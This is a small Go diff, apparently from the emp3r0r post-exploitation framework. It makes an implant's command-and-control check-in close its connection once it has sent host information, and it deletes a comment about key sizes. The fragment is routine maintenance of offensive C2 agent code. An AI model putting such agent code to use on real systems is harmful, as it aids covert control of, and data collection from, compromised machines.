@@ -34,6 +34,7 @@ func CheckIn() (err error) {
 	if err != nil {
 		return err
 	}
+	defer conn.Close()
 	out := json.NewEncoder(conn)
 	err = out.Encode(info)
 	if err == nil {
@@ -49,7 +50,6 @@ func IsCCOnline(proxy string) bool {
 			Timeout:   60 * time.Second,
 			KeepAlive: 30 * time.Second,
 		}).Dial,
-		// We use ABSURDLY large keys, and should probably not.
 		TLSHandshakeTimeout: 60 * time.Second,
 	}
 	if proxy != "" && strings.HasPrefix(emp3r0r_data.Transport, "HTTP2") {
